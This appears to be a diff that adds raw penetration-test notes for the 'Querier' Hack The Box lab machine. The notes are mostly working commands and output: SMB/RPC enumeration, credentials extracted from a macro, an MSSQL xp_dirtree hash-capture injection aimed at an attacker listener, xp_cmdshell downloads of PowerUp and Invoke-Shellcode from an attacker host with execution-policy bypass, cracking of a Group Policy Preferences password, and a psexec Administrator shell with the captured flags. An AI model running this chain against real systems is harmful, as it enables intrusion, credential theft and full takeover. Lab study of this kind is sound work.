@@ -1,0 +1,504 @@
+
+password: anonymous
+
+root@kali:~/HTB/Querier# smbclient -L //10.10.10.125
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	Reports         Disk      
+Reconnecting with SMB1 for workgroup listing.
+Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+
+root@kali:~/HTB/Querier# smbmap -p anonymous -H 10.10.10.125
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.125...
+[+] IP: 10.10.10.125:445	Name: 10.10.10.125                                      
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	ADMIN$                                            	NO ACCESS
+	C$                                                	NO ACCESS
+	IPC$                                              	READ ONLY
+	Reports                                           	READ ONLY
+
+
+root@kali:~/HTB/Querier# smbmap -p anonymous -R IPC$ -H 10.10.10.125
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.125...
+[+] IP: 10.10.10.125:445	Name: 10.10.10.125                                      
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	IPC$                                              	READ ONLY
+	.\
+	-r--r--r--                3 Mon Jan  1 00:13:36 1601	InitShutdown
+	-r--r--r--                4 Mon Jan  1 00:13:36 1601	lsass
+	-r--r--r--                3 Mon Jan  1 00:13:36 1601	ntsvcs
+	-r--r--r--                3 Mon Jan  1 00:13:36 1601	scerpc
+	-r--r--r--                1 Mon Jan  1 00:13:36 1601	Winsock2\CatalogChangeListener-33c-0
+	-r--r--r--                3 Mon Jan  1 00:13:36 1601	epmapper
+	-r--r--r--                1 Mon Jan  1 00:13:36 1601	Winsock2\CatalogChangeListener-1d0-0
+	-r--r--r--                3 Mon Jan  1 00:13:36 1601	LSM_API_service
+	-r--r--r--                3 Mon Jan  1 00:13:36 1601	eventlog
+	-r--r--r--                1 Mon Jan  1 00:13:36 1601	Winsock2\CatalogChangeListener-3f0-0
+	-r--r--r--                3 Mon Jan  1 00:13:36 1601	atsvc
+	-r--r--r--                1 Mon Jan  1 00:13:36 1601	Winsock2\CatalogChangeListener-3b8-0
+	-r--r--r--                4 Mon Jan  1 00:13:36 1601	wkssvc
+	-r--r--r--                1 Mon Jan  1 00:13:36 1601	Winsock2\CatalogChangeListener-258-0
+	-r--r--r--                4 Mon Jan  1 00:13:36 1601	spoolss
+	-r--r--r--                1 Mon Jan  1 00:13:36 1601	Winsock2\CatalogChangeListener-7f0-0
+	-r--r--r--                3 Mon Jan  1 00:13:36 1601	trkwks
+	-r--r--r--                4 Mon Jan  1 00:13:36 1601	srvsvc
+	-r--r--r--                1 Mon Jan  1 00:13:36 1601	vgauth-service
+	-r--r--r--                1 Mon Jan  1 00:13:36 1601	Winsock2\CatalogChangeListener-648-0
+	-r--r--r--                3 Mon Jan  1 00:13:36 1601	ROUTER
+	-r--r--r--                3 Mon Jan  1 00:13:36 1601	W32TIME_ALT
+	-r--r--r--                6 Mon Jan  1 00:13:36 1601	SQLLocal\MSSQLSERVER
+	-r--r--r--                2 Mon Jan  1 00:13:36 1601	sql\query
+	-r--r--r--                1 Mon Jan  1 00:13:36 1601	Winsock2\CatalogChangeListener-250-0
+	-r--r--r--                1 Mon Jan  1 00:13:36 1601	PSHost.131968699887952116.2176.DefaultAppDomain.powershell
+	-r--r--r--                1 Mon Jan  1 00:13:36 1601	PSHost.131968701484034392.3244.DefaultAppDomain.powershell
+	-r--r--r--                1 Mon Jan  1 00:13:36 1601	PSHost.131968702184196032.3480.DefaultAppDomain.powershell
+
+
+
+
+
+rpc
+pass: anonymous
+
+
+root@kali:~/HTB/Querier# rpcclient -U "" 10.10.10.125
+Enter WORKGROUP\'s password: 
+rpcclient $> ls
+command not found: ls
+rpcclient $> dir
+command not found: dir
+rpcclient $> srvinfo
+	10.10.10.125   Wk Sv Sql NT SNT     
+	platform_id     :	500
+	os version      :	10.0
+	server type     :	0x9007
+
+
+
+windows 10
+windows server 2016
+windows server 2019
+
+rpcclient $> getusername
+Account Name: Guest, Authority Name: QUERIER
+
+
+root@kali:~/HTB/Querier# rpcclient -U "" 10.10.10.125
+Enter WORKGROUP\'s password: 
+rpcclient $> lsaenumsid
+found 17 SIDs
+
+S-1-5-90-0
+S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
+S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430
+S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
+S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
+S-1-5-80-0
+S-1-5-6
+S-1-5-32-559
+S-1-5-32-555
+S-1-5-32-551
+S-1-5-32-545
+S-1-5-32-544
+S-1-5-21-3654930405-3667393904-3517260747-1003
+S-1-5-21-3654930405-3667393904-3517260747-1001
+S-1-5-20
+S-1-5-19
+S-1-1-0
+rpcclient $> lookupsids S-1-5-90-0
+S-1-5-90-0 Window Manager\Window Manager Group (5)
+rpcclient $> lookupsids S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
+S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 NT SERVICE\MSSQLSERVER (5)
+rpcclient $> lookupsids S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430
+S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430 NT SERVICE\SQLSERVERAGENT (5)
+rpcclient $> lookupsids S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
+S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420 NT SERVICE\WdiServiceHost (5)
+rpcclient $> lookupsids S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
+S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775 NT SERVICE\SQLTELEMETRY (5)
+rpcclient $> lookupsids S-1-5-80-0
+S-1-5-80-0 NT SERVICE\ALL SERVICES (5)
+rpcclient $> lookupsids S-1-5-6
+S-1-5-6 NT AUTHORITY\SERVICE (5)
+rpcclient $> lookupsids S-1-5-32-559
+S-1-5-32-559 BUILTIN\Performance Log Users (4)
+rpcclient $> lookupsids S-1-5-32-555
+S-1-5-32-555 BUILTIN\Remote Desktop Users (4)
+rpcclient $> lookupsids S-1-5-32-551
+S-1-5-32-551 BUILTIN\Backup Operators (4)
+rpcclient $> lookupsids S-1-5-32-545
+S-1-5-32-545 BUILTIN\Users (4)
+rpcclient $> lookupsids S-1-5-32-544
+S-1-5-32-544 BUILTIN\Administrators (4)
+rpcclient $> lookupsids S-1-5-21-3654930405-3667393904-3517260747-1003
+S-1-5-21-3654930405-3667393904-3517260747-1003 QUERIER\SQLServer2005SQLBrowserUser$QUERIER (4)
+rpcclient $> lookupsids S-1-5-21-3654930405-3667393904-3517260747-1001
+S-1-5-21-3654930405-3667393904-3517260747-1001 QUERIER\mssql-svc (1)
+rpcclient $> lookupsids S-1-5-20
+S-1-5-20 NT AUTHORITY\NETWORK SERVICE (5)
+rpcclient $> lookupsids S-1-5-19
+S-1-5-19 NT AUTHORITY\LOCAL SERVICE (5)
+rpcclient $> lookupsids S-1-1-0
+S-1-1-0 \Everyone (5)
+
+
+exfiltrate creds from xlms file from Reports SMB Share
+strings -a vbaProject.bin
+Database=volume
+Uid=reporting
+Pwd=PcwTWTHRwryjc$c6
+
+
+root@kali:~/HTB/Querier# rpcclient -U reporting 10.10.10.125
+Enter WORKGROUP\reporting's password: 
+rpcclient $> lookupnames reporting
+reporting S-1-5-21-3654930405-3667393904-3517260747-1002 (User: 1)
+
+
+
+
+root@kali:~/HTB/Querier# python /root/toolbox/impacket/build/scripts-2.7/mssqlclient.py -p 1433 reporting:PcwTWTHRwryjc\$c6@10.10.10.125 -windows-auth
+Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL> 
+SQL> SELECT @@version
+                                                                                                                                                                                                                                                                  
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
+Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) 
+	Aug 22 2017 17:04:49 
+	Copyright (C) 2017 Microsoft Corporation
+	Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+                                       
+SQL> SELECT user_name()
+                                                                                                                                   
+--------------------------------------------------------------------------------------------------------------------------------   
+reporting                                                                                                                          
+SQL> SELECT system_user
+                                                                                                                                   
+--------------------------------------------------------------------------------------------------------------------------------   
+QUERIER\reporting                                                                                                                  
+SQL> SELECT name FROM master..syslogins
+name                                                                                                                               
+--------------------------------------------------------------------------------------------------------------------------------   
+sa                                                                                                                                 
+QUERIER\reporting                                                                                                                  
+
+
+
+COMMAND EXECUTION
+SQL> ;declare @q varchar(200);set @q='\\10.10.15.170\what'+(SELECT SUBSTRING(@@version,1,9))+'.malicious.com/foo'; exec master.dbo.xp_dirtree @q; --
+
+
+root@kali:~/HTB/Querier# nc -lvp 445
+listening on [any] 445 ...
+connect to [10.10.15.170] from htb.local [10.10.10.125] 49672
+E�SMBrS�����"NT LM 0.12SMB 2.002SMB 2.???
+
+
+
+
+
+python /root/toolbox/impacket/build/scripts-2.7/mssqlclient.py -p 1433 MSSQL-SVC:corporate568@10.10.10.125 -windows-auth
+
+root@kali:~/HTB/Querier# python /root/toolbox/impacket/build/scripts-2.7/mssqlclient.py -p 1433 MSSQL-SVC:corporate568@10.10.10.125 -windows-auth
+Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL> xp_cmdshell dir CatRoot
+output                                                                             
+--------------------------------------------------------------------------------   
+ Volume in drive C has no label.                                                   
+ Volume Serial Number is FE98-F373                                                 
+NULL                                                                               
+ Directory of C:\Windows\system32\CatRoot                                          
+NULL                                                                               
+09/15/2018  07:19 AM    <DIR>          .                                           
+09/15/2018  07:19 AM    <DIR>          ..                                          
+09/15/2018  07:19 AM    <DIR>          {127D0A1D-4EF2-11D1-8608-00C04FC295EE}      
+01/28/2019  10:41 PM    <DIR>          {F750E6C3-38EE-11D1-85E5-00C04FC295EE}      
+               0 File(s)              0 bytes                                      
+               4 Dir(s)   6,493,990,912 bytes free                                 
+NULL                                                                               
+
+
+
+SQL> xp_cmdshell cd C:\ && dir *user.txt /s
+output                                                                             
+--------------------------------------------------------------------------------   
+ Volume in drive C has no label.                                                   
+ Volume Serial Number is FE98-F373                                                 
+NULL                                                                               
+ Directory of C:\Users\mssql-svc\Desktop                                           
+NULL                                                                               
+01/28/2019  12:08 AM                33 user.txt                                    
+               1 File(s)             33 bytes                                      
+NULL                                                                               
+     Total Files Listed:                                                           
+               1 File(s)             33 bytes                                      
+               0 Dir(s)   6,591,369,216 bytes free                                 
+NULL                                                                               
+SQL> xp_cmdshell type C:\Users\mssql-svc\Desktop\user.txt
+output                                                                             
+--------------------------------------------------------------------------------   
+c37b41bb669da345bb14de50faab3c16                                                   
+NULL                                                                               
+SQL> 
+
+
+
+
+
+
+
+
+SQL> xp_cmdshell powershell.exe wget http://10.10.14.159/Invoke-Shellcode.ps1
+output                                                                             
+--------------------------------------------------------------------------------   
+At line:1 char:1                                                                   
++ wget http://10.10.14.159/Invoke-Shellcode.ps1                                    
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                    
+This script contains malicious content and has been blocked by your antivirus software.   
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException   
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent                      
+                                                                                   
+NULL                  
+
+
+SQL> xp_cmdshell powershell wget http://10.10.14.159:8000/PowerUp.ps1 -O C:\Windows\PowerUp.ps1
+output                                                                             
+--------------------------------------------------------------------------------   
+At line:1 char:1                                                                   
++ wget http://10.10.14.159:800/PowerUp.ps1 -O C:\Windows\PowerUp.ps1               
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~               
+This script contains malicious content and has been blocked by your antivirus software.   
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException   
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent                      
+                                                                                   
+NULL                                                                               
+
+
+xp_cmdshell powershell -nop -exec bypass wget http://10.10.14.159:8000/PowerUp.ps1 -O C:\PowerUp.ps1
+
+
+SQL> xp_cmdshell powershell $client = new-object System.Net.WebClient && $client.DownloadFile("http://10.10.14.159:8000/PowerUp.ps1","C:\Windows\PowerUp.ps1")
+output                                                                             
+--------------------------------------------------------------------------------   
+At line:1 char:1                                                                   
++ $client = new-object System.Net.WebClient                                        
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                        
+This script contains malicious content and has been blocked by your antivirus software.   
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException   
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent                      
+                                                                                   
+NULL                                                                               
+
+
+
+SQL> xp_cmdshell powershell -nop -exec bypass wget http://10.10.14.159:8000/PowerUp.ps1 -O C:\Users\mssql-svc\PowerUp.ps1
+output                                                                             
+--------------------------------------------------------------------------------   
+NULL                                                                               
+SQL> xp_cmdshell dir C:\Users\mssql-svc
+output                                                                             
+--------------------------------------------------------------------------------   
+ Volume in drive C has no label.                                                   
+ Volume Serial Number is FE98-F373                                                 
+NULL                                                                               
+ Directory of C:\Users\mssql-svc                                                   
+NULL                                                                               
+03/16/2019  07:34 PM    <DIR>          .                                           
+03/16/2019  07:34 PM    <DIR>          ..                                          
+01/28/2019  11:42 PM    <DIR>          3D Objects                                  
+01/28/2019  11:42 PM    <DIR>          Contacts                                    
+01/28/2019  11:42 PM    <DIR>          Desktop                                     
+03/16/2019  07:22 PM    <DIR>          Documents                                   
+01/28/2019  11:42 PM    <DIR>          Downloads                                   
+01/28/2019  11:42 PM    <DIR>          Favorites                                   
+01/28/2019  11:42 PM    <DIR>          Links                                       
+01/28/2019  11:42 PM    <DIR>          Music                                       
+01/28/2019  11:42 PM    <DIR>          Pictures                                    
+03/16/2019  07:34 PM           562,841 PowerUp.ps1                                 
+01/28/2019  11:42 PM    <DIR>          Saved Games                                 
+01/28/2019  11:42 PM    <DIR>          Searches                                    
+01/28/2019  11:42 PM    <DIR>          Videos                                      
+               1 File(s)        562,841 bytes                                      
+              14 Dir(s)   6,604,058,624 bytes free                                 
+NULL                                                                               
+
+
+
+SQL> xp_cmdshell powershell.exe -exec bypass -Command Import-Module C:\Users\mssql-svc\PowerUp.ps1; Invoke-AllChecks
+output                                                                             
+--------------------------------------------------------------------------------   
+NULL                                                                               
+[*] Running Invoke-AllChecks                                                       
+NULL                                                                               
+NULL                                                                               
+[*] Checking if user is in a local group with administrative privileges...         
+NULL                                                                               
+NULL                                                                               
+[*] Checking for unquoted service paths...                                         
+NULL                                                                               
+NULL                                                                               
+[*] Checking service executable and argument permissions...                        
+NULL                                                                               
+NULL                                                                               
+[*] Checking service permissions...                                                
+NULL                                                                               
+NULL                                                                               
+ServiceName   : UsoSvc                                                             
+Path          : C:\Windows\system32\svchost.exe -k netsvcs -p                      
+StartName     : LocalSystem                                                        
+AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'                                 
+CanRestart    : True                                                               
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+[*] Checking %PATH% for potentially hijackable DLL locations...                    
+NULL                                                                               
+NULL                                                                               
+ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps         
+IdentityReference : QUERIER\mssql-svc                                              
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}          
+%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps         
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'   
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+[*] Checking for AlwaysInstallElevated registry key...                             
+NULL                                                                               
+NULL                                                                               
+[*] Checking for Autologon credentials in registry...                              
+NULL                                                                               
+NULL                                                                               
+[*] Checking for modifidable registry autoruns and configs...                      
+NULL                                                                               
+NULL                                                                               
+[*] Checking for modifiable schtask files/configs...                               
+NULL                                                                               
+NULL                                                                               
+[*] Checking for unattended install files...                                       
+NULL                                                                               
+NULL                                                                               
+UnattendPath : C:\Windows\Panther\Unattend.xml                                     
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+[*] Checking for encrypted web.config strings...                                   
+NULL                                                                               
+NULL                                                                               
+[*] Checking for encrypted application pool and virtual directory passwords...     
+NULL                                                                               
+NULL                                                                               
+[*] Checking for plaintext passwords in McAfee SiteList.xml files....              
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+[*] Checking for cached Group Policy Preferences .xml files....                    
+NULL                                                                               
+NULL                                                                               
+Changed   : {2019-01-28 23:12:48}                                                  
+UserNames : {Administrator}                                                        
+NewName   : [BLANK]                                                                
+Passwords : {MyUnclesAreMarioAndLuigi!!1!}                                         
+File      : C:\ProgramData\Microsoft\Group                                         
+            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml   
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+SQL> 
+
+
+
+SQL> xp_cmdshell type "C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"
+output                                                                             
+--------------------------------------------------------------------------------   
+<?xml version="1.0" encoding="UTF-8" ?><Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">   
+<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator" image="2" changed="2019-01-28 23:12:48" uid="{CD450F70-CDB8-4948-B908-F8D038C59B6C}" userContext="0" removePolicy="0" policyApplied="1">   
+<Properties action="U" newName="" fullName="" description="" cpassword="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="Administrator"></Prope   
+rties></User></Groups>                                                             
+SQL> 
+
+
+
+root@kali:~/HTB/Querier/Server# gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
+/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
+MyUnclesAreMarioAndLuigi!!1!
+root@kali:~/HTB/Querier/Server# 
+
+
+
+
+root@kali:~/HTB/Querier# python /root/toolbox/impacket/examples/psexec.py Administrator:MyUnclesAreMarioAndLuigi\!\!1\!@10.10.10.125
+Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.125.....
+[*] Found writable share ADMIN$
+[*] Uploading file GDSWjIuc.exe
+[*] Opening SVCManager on 10.10.10.125.....
+[*] Creating service iSjk on 10.10.10.125.....
+[*] Starting service iSjk.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.292]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\ && dir *root.txt /s                
+ Volume in drive C has no label.
+ Volume Serial Number is FE98-F373
+
+ Directory of C:\Users\Administrator\Desktop
+
+01/28/2019  12:08 AM                33 root.txt
+               1 File(s)             33 bytes
+
+     Total Files Listed:
+               1 File(s)             33 bytes
+               0 Dir(s)   6,566,326,272 bytes free
+
+C:\>type C:\Users\Administrator\Desktop\root.txt
+b19c3794f786a1fdcf205f81497c3592
+
+C:\>
+
+
+
+
+WINDOWS UNQUOTED SERVICE PATH
+
+wmic service get pathname,startname
+
+
